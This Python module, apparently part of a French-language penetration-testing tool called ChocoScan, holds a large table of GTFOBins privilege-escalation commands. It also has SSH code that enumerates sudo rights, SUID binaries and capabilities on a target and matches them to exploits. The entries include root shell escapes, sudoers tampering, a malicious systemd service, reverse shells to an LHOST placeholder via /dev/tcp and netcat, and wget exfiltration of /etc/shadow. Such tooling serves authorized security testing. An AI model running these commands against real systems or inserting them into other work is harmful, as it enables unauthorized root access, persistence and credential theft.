"""
ChocoScan — GTFOBins integration.

Deux modes :
  1. Lookup statique : pour les services détectés dans le scan réseau
     (ex: MySQL détecté → sudo mysql donne un shell)
  2. Collecte SSH : se connecte à la cible et exécute sudo -l + find SUID
     pour identifier les vecteurs de privesc réels

Référence : https://gtfobins.github.io/
Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations
from dataclasses import dataclass, field


@dataclass
class GTFOEntry:
    binary:   str
    method:   str                      # sudo | suid | capabilities | cron | writable
    command:  str                      # Commande d'exploitation
    notes:    str = ""
    lhost:    str = ""                 # Si besoin d'un reverse shell


@dataclass
class GTFOResult:
    host:     str
    vector:   str                      # "sudo" | "suid" | "capabilities"
    binary:   str
    raw_line: str                      # Ligne originale (ex: "(ALL) NOPASSWD: /usr/bin/vim")
    exploits: list[GTFOEntry]


# ── Base GTFOBins ─────────────────────────────────────────────────────────────
#
# Commandes vérifiées sur GTFOBins.github.io.
# Format : binary -> {method: GTFOEntry}

GTFOBINS: dict[str, dict[str, GTFOEntry]] = {

    # ── Shell direct ─────────────────────────────────────────────────────────
    "bash": {
        "sudo": GTFOEntry("bash", "sudo", "sudo bash"),
        "suid": GTFOEntry("bash", "suid", "bash -p"),
        "capabilities": GTFOEntry("bash", "capabilities", "./bash -p"),
    },
    "sh": {
        "sudo": GTFOEntry("sh", "sudo", "sudo sh"),
        "suid": GTFOEntry("sh", "suid", "sh -p"),
    },
    "dash": {
        "sudo": GTFOEntry("dash", "sudo", "sudo dash"),
        "suid": GTFOEntry("dash", "suid", "dash -p"),
    },
    "zsh": {
        "sudo": GTFOEntry("zsh", "sudo", "sudo zsh"),
        "suid": GTFOEntry("zsh", "suid", "zsh"),
    },

    # ── Éditeurs ─────────────────────────────────────────────────────────────
    "vim": {
        "sudo": GTFOEntry("vim", "sudo", "sudo vim -c ':!/bin/sh'",
                          "Ou : sudo vim -c ':set shell=/bin/sh' -c ':shell'"),
        "suid": GTFOEntry("vim", "suid",
                          "vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"),
    },
    "vi": {
        "sudo": GTFOEntry("vi", "sudo", "sudo vi -c ':!/bin/sh'"),
        "suid": GTFOEntry("vi", "suid", "vi -c ':!/bin/sh -p'"),
    },
    "nano": {
        "sudo": GTFOEntry("nano", "sudo",
                          "sudo nano\n# Ctrl+R, Ctrl+X, puis taper : reset; bash 1>&0 2>&0"),
    },
    "emacs": {
        "sudo": GTFOEntry("emacs", "sudo", "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"),
        "suid": GTFOEntry("emacs", "suid", "emacs -Q -nw --eval '(term \"/bin/sh\")'"),
    },

    # ── Visualiseurs ─────────────────────────────────────────────────────────
    "less": {
        "sudo": GTFOEntry("less", "sudo",
                          "sudo less /etc/passwd\n# Puis taper : !/bin/sh"),
        "suid": GTFOEntry("less", "suid",
                          "less /etc/passwd\n# Puis taper : !/bin/sh -p"),
    },
    "more": {
        "sudo": GTFOEntry("more", "sudo",
                          "sudo more /etc/passwd\n# Puis taper : !/bin/sh"),
        "suid": GTFOEntry("more", "suid",
                          "more /etc/passwd\n# Puis taper : !/bin/sh -p"),
    },
    "man": {
        "sudo": GTFOEntry("man", "sudo",
                          "sudo man man\n# Puis taper : !/bin/sh"),
    },

    # ── Utilitaires fichiers ──────────────────────────────────────────────────
    "find": {
        "sudo": GTFOEntry("find", "sudo", "sudo find . -exec /bin/sh \\; -quit"),
        "suid": GTFOEntry("find", "suid", "find . -exec /bin/sh -p \\; -quit"),
    },
    "tar": {
        "sudo": GTFOEntry("tar", "sudo",
                          "sudo tar -cf /dev/null /dev/null --checkpoint=1 "
                          "--checkpoint-action=exec=/bin/sh"),
        "suid": GTFOEntry("tar", "suid",
                          "tar -cf /dev/null /dev/null --checkpoint=1 "
                          "--checkpoint-action=exec='/bin/sh -p'"),
    },
    "zip": {
        "sudo": GTFOEntry("zip", "sudo",
                          "TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T -TT 'sh #' && rm $TF"),
    },
    "unzip": {
        "sudo": GTFOEntry("unzip", "sudo",
                          "sudo unzip -K shell.zip  # Le zip doit contenir un SUID shell"),
    },
    "cp": {
        "sudo": GTFOEntry("cp", "sudo",
                          "# Lire un fichier : sudo cp /root/root.txt /tmp/root.txt\n"
                          "# SUID bash : sudo cp /bin/bash /tmp/b && sudo chmod +s /tmp/b && /tmp/b -p"),
        "suid": GTFOEntry("cp", "suid", "cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p",
                          "Possible seulement si on peut choisir la destination"),
    },
    "mv": {
        "sudo": GTFOEntry("mv", "sudo",
                          "# Remplacer /etc/sudoers ou /etc/passwd"),
    },
    "cat": {
        "sudo": GTFOEntry("cat", "sudo", "sudo cat /root/root.txt",
                          "Lecture seule — utile pour lire shadow/root.txt"),
        "suid": GTFOEntry("cat", "suid", "cat /etc/shadow",
                          "Lecture seule"),
    },
    "tee": {
        "sudo": GTFOEntry("tee", "sudo",
                          "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers"),
    },

    # ── Langages ──────────────────────────────────────────────────────────────
    "python": {
        "sudo": GTFOEntry("python", "sudo",
                          "sudo python -c 'import os; os.system(\"/bin/sh\")'"),
        "suid": GTFOEntry("python", "suid",
                          "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"),
        "capabilities": GTFOEntry("python", "capabilities",
                                  "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"),
    },
    "python3": {
        "sudo": GTFOEntry("python3", "sudo",
                          "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"),
        "suid": GTFOEntry("python3", "suid",
                          "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"),
        "capabilities": GTFOEntry("python3", "capabilities",
                                  "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"),
    },
    "perl": {
        "sudo": GTFOEntry("perl", "sudo",
                          "sudo perl -e 'exec \"/bin/sh\";'"),
        "suid": GTFOEntry("perl", "suid",
                          "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"),
    },
    "ruby": {
        "sudo": GTFOEntry("ruby", "sudo",
                          "sudo ruby -e 'exec \"/bin/sh\"'"),
        "suid": GTFOEntry("ruby", "suid",
                          "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"),
    },
    "php": {
        "sudo": GTFOEntry("php", "sudo",
                          "sudo php -r 'system(\"/bin/sh\");'"),
        "suid": GTFOEntry("php", "suid",
                          "php -r 'pcntl_exec(\"/bin/sh\");'"),
    },
    "lua": {
        "sudo": GTFOEntry("lua", "sudo",
                          "sudo lua -e 'os.execute(\"/bin/sh\")'"),
    },
    "node": {
        "sudo": GTFOEntry("node", "sudo",
                          "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"),
        "suid": GTFOEntry("node", "suid",
                          "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio:[0,1,2]})'"),
    },

    # ── Outils système ────────────────────────────────────────────────────────
    "env": {
        "sudo": GTFOEntry("env", "sudo", "sudo env /bin/sh"),
        "suid": GTFOEntry("env", "suid", "env /bin/sh -p"),
        "capabilities": GTFOEntry("env", "capabilities", "env /bin/sh -p"),
    },
    "awk": {
        "sudo": GTFOEntry("awk", "sudo", "sudo awk 'BEGIN {system(\"/bin/sh\")}'"),
        "suid": GTFOEntry("awk", "suid", "awk 'BEGIN {system(\"/bin/sh -p\")}'"),
    },
    "nmap": {
        "sudo": GTFOEntry("nmap", "sudo",
                          "TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' > $TF "
                          "&& sudo nmap --script=$TF"),
        "suid": GTFOEntry("nmap", "suid",
                          "nmap --interactive  # Ancienne version (<5.21)\n"
                          "# Puis taper : !sh"),
    },
    "strace": {
        "sudo": GTFOEntry("strace", "sudo", "sudo strace -o /dev/null /bin/sh"),
        "suid": GTFOEntry("strace", "suid", "strace -o /dev/null /bin/sh -p"),
    },
    "nc": {
        "sudo": GTFOEntry("nc", "sudo", "sudo nc -e /bin/sh TARGET 4444",
                          "Reverse shell vers votre machine"),
    },
    "netcat": {
        "sudo": GTFOEntry("netcat", "sudo", "sudo netcat -e /bin/sh TARGET 4444"),
    },

    # ── Réseau ────────────────────────────────────────────────────────────────
    "curl": {
        "sudo": GTFOEntry("curl", "sudo",
                          "sudo curl file:///etc/shadow -o /tmp/shadow",
                          "Lecture de fichiers arbitraires"),
    },
    "wget": {
        "sudo": GTFOEntry("wget", "sudo",
                          "sudo wget --post-file=/etc/shadow http://LHOST:PORT/",
                          "Exfiltration de fichiers"),
    },
    "ftp": {
        "sudo": GTFOEntry("ftp", "sudo",
                          "sudo ftp\n# Puis taper : !/bin/sh"),
    },
    "git": {
        "sudo": GTFOEntry("git", "sudo",
                          "sudo git -p help config\n# Puis taper : !/bin/sh"),
    },
    "ssh": {
        "sudo": GTFOEntry("ssh", "sudo",
                          "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"),
    },

    # ── Bases de données ──────────────────────────────────────────────────────
    "mysql": {
        "sudo": GTFOEntry("mysql", "sudo",
                          "sudo mysql -u root -e '\\! /bin/sh'"),
        "suid": GTFOEntry("mysql", "suid",
                          "mysql -u root -e '\\! /bin/sh'"),
    },
    "sqlite3": {
        "sudo": GTFOEntry("sqlite3", "sudo",
                          "sudo sqlite3 /dev/null '.shell /bin/sh'"),
        "suid": GTFOEntry("sqlite3", "suid",
                          "sqlite3 /dev/null '.shell /bin/sh -p'"),
    },

    # ── Admin système ─────────────────────────────────────────────────────────
    "chmod": {
        "sudo": GTFOEntry("chmod", "sudo",
                          "sudo chmod +s /bin/bash && /bin/bash -p",
                          "Ou rendre /etc/sudoers writable"),
    },
    "chown": {
        "sudo": GTFOEntry("chown", "sudo",
                          "sudo chown $(id -un):$(id -gn) /etc/sudoers"),
    },
    "dd": {
        "sudo": GTFOEntry("dd", "sudo",
                          "echo 'user ALL=(ALL) NOPASSWD:ALL' | "
                          "sudo dd of=/etc/sudoers bs=1 seek=$(wc -c < /etc/sudoers) conv=notrunc"),
        "suid": GTFOEntry("dd", "suid", "dd if=/etc/shadow"),
    },
    "crontab": {
        "sudo": GTFOEntry("crontab", "sudo",
                          "sudo crontab -e\n# Ajouter : * * * * * /bin/sh -i > /dev/tcp/LHOST/4444 0>&1"),
    },
    "at": {
        "sudo": GTFOEntry("at", "sudo",
                          "echo '/bin/sh -i > /dev/tcp/LHOST/4444 0>&1' | sudo at now+1minute"),
    },
    "screen": {
        "sudo": GTFOEntry("screen", "sudo", "sudo screen"),
        "suid": GTFOEntry("screen", "suid", "screen",
                          "CVE-2017-5618 pour screen 4.5.0"),
    },
    "tmux": {
        "sudo": GTFOEntry("tmux", "sudo", "sudo tmux"),
    },
    "passwd": {
        "sudo": GTFOEntry("passwd", "sudo",
                          "sudo passwd root  # Changer le mot de passe root"),
    },
    "mount": {
        "sudo": GTFOEntry("mount", "sudo",
                          "sudo mount -o bind /bin/sh /bin/mount && sudo mount"),
    },
    "docker": {
        "sudo": GTFOEntry("docker", "sudo",
                          "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                          "Accès root complet via container"),
    },
    "kubectl": {
        "sudo": GTFOEntry("kubectl", "sudo",
                          "kubectl run r00t --restart=Never -ti --rm --image lol "
                          "--overrides='{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\","
                          "\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\","
                          "\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":"
                          "{\"privileged\":true}}]}}'"),
    },
    "service": {
        "sudo": GTFOEntry("service", "sudo",
                          "sudo service ../../bin/sh start"),
    },
    "systemctl": {
        "sudo": GTFOEntry("systemctl", "sudo",
                          "TF=$(mktemp -d) && echo '[Service]\\nType=oneshot\\nExecStart=/bin/sh -c "
                          "'id > /tmp/id'\\n[Install]\\nWantedBy=multi-user.target' > $TF/evil.service "
                          "&& sudo systemctl link $TF/evil.service && sudo systemctl enable --now evil.service"),
    },
}


# ── Collecte SSH ──────────────────────────────────────────────────────────────

def collect_gtfobins_via_ssh(client) -> dict[str, list[str]]:
    """
    Se connecte à la cible et exécute :
      - sudo -l         → liste les binaires sudo disponibles
      - find / -perm -4000 → liste les binaires SUID

    Retourne {"sudo": ["/usr/bin/vim", ...], "suid": ["/usr/bin/find", ...]}
    """
    results: dict[str, list[str]] = {"sudo": [], "suid": [], "capabilities": []}

    def run(cmd: str) -> str:
        try:
            stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
            return stdout.read().decode("utf-8", errors="replace")
        except Exception:
            return ""

    # sudo -l
    sudo_out = run("sudo -l 2>/dev/null")
    for line in sudo_out.splitlines():
        line = line.strip()
        # Lignes comme : (ALL) NOPASSWD: /usr/bin/vim, /bin/bash
        if "/" in line and any(kw in line.lower() for kw in ("nopasswd", "all", "/bin/", "/usr/")):
            # Extrait les binaires
            import re
            bins = re.findall(r"(/[a-zA-Z0-9/_.-]+)", line)
            for b in bins:
                b = b.rstrip(",")
                # Garde seulement les exécutables (ignore paths avec espaces ou options)
                if not b.endswith(("/etc", "/var", "/tmp")) and " " not in b:
                    if b not in results["sudo"]:
                        results["sudo"].append(b)

    # SUID binaries
    suid_out = run("find / -perm -4000 -type f 2>/dev/null")
    for line in suid_out.splitlines():
        line = line.strip()
        if line and line.startswith("/"):
            results["suid"].append(line)

    # Capabilities
    caps_out = run("getcap -r / 2>/dev/null")
    for line in caps_out.splitlines():
        line = line.strip()
        if "cap_setuid" in line.lower() or "cap_net_raw" in line.lower():
            binary = line.split()[0] if line else ""
            if binary:
                results["capabilities"].append(binary)

    return results


# ── Lookup principal ──────────────────────────────────────────────────────────

def get_gtfobins(binary_path: str, method: str) -> GTFOEntry | None:
    """
    Retourne l'entrée GTFOBins pour un binaire et une méthode donnés.
    `binary_path` peut être un chemin complet (/usr/bin/vim) ou juste le nom (vim).
    """
    binary = binary_path.rstrip("/").split("/")[-1].lower()
    entry = GTFOBINS.get(binary)
    if not entry:
        return None
    return entry.get(method)


def analyze_ssh_findings(findings: dict[str, list[str]],
                          host: str = "TARGET") -> list[GTFOResult]:
    """
    Prend les résultats de collect_gtfobins_via_ssh et génère
    une liste de GTFOResult avec les commandes d'exploitation.
    """
    results: list[GTFOResult] = []

    for method in ("sudo", "suid", "capabilities"):
        for binary_path in findings.get(method, []):
            binary = binary_path.rstrip("/").split("/")[-1].lower()
            entry = get_gtfobins(binary_path, method)
            if entry:
                results.append(GTFOResult(
                    host=host,
                    vector=method,
                    binary=binary,
                    raw_line=binary_path,
                    exploits=[entry],
                ))

    # Trie par intérêt (shells directs en premier)
    priority = {"bash":0,"sh":0,"python3":1,"python":1,"vim":2,"vi":2,
                "find":2,"perl":3,"ruby":3,"php":3,"lua":3}
    results.sort(key=lambda r: priority.get(r.binary, 10))
    return results


def get_static_gtfobins_for_service(service_name: str) -> list[GTFOEntry]:
    """
    Pour un service détecté dans le scan réseau, retourne les vecteurs GTFOBins
    liés à ce service (ex: MySQL détecté → sudo mysql peut donner un shell).
    """
    SERVICE_TO_BINARY = {
        "mysql":    "mysql",
        "sqlite":   "sqlite3",
        "ftp":      "ftp",
        "ssh":      "ssh",
        "docker":   "docker",
        "kubectl":  "kubectl",
        "python":   "python3",
        "node":     "node",
        "php":      "php",
        "ruby":     "ruby",
        "lua":      "lua",
        "perl":     "perl",
    }
    binary = SERVICE_TO_BINARY.get(service_name.lower())
    if not binary:
        return []
    entry = GTFOBINS.get(binary, {})
    return [e for e in entry.values() if e.method == "sudo"]
